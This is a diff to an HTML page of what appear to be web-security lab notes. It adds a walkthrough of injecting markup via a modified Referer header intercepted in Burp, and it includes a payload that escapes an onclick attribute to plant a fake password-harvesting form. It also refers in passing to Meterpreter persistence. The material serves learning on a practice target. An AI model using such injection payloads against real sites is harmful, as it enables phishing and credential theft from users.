@@ -64,14 +64,24 @@ Deploying a Meterpreter shell is one way to create a well obfuscated persisitent
 		<h3>Via HTTP Headers</h3>
 		<p>
 			These exploits can work under a man in the middle the attack, or a clever manipulation of the iframe header to load the web page silently in the background. The target page here is DNS lookup page. We must always check the context and filters on the 
-			Using Burp intercept the outgoing request.
+			Using Burp intercept the outgoing request. In the DNS lookup page, I am targetting the vulnerability labelled as <b>"Those Back Buttons"</b>.
 		</p>
+			<p>
+				In the beginning , visit this page from another page. As MITM simulation, intercept using Burp, and modify the Referer header to something like this &lt+&gt to see where the payload is getting injected. When the page loads, inspect the backbutton which loads the value from 
+				<i>window.href.location</i>. Its value will be like this.
 		<pre>
+&lta onclick="document.location.href='&lt+&gt';"&gt
+
 		</pre>
+		So , now knowing the context and the fact that there is no encoding or sanitization defense, we do this.
+		<pre>
+';"&lt&gtform action='Marale'&lt&gtinput type='password' name='password' placeholder='password'/&lt&gtinput name='name' placeholder='name'/&lt&gtinput type='submit'/&lt&gtlt/form&gt&lt!--
+		</pre>
+	</p>
 	</li>
-	<li>DOM Manipulation</li>
-	<li>Cookie Manipulation</li>
-	<li>HTTP Parameter Pollution</li>
+	<li><h3>DOM Manipulation</h3></li>
+	<li><h3>Cookie Manipulation</h3></li>
+	<li><h3>HTTP Parameter Pollution</h3></li>
 	</ul>
 </li>
 
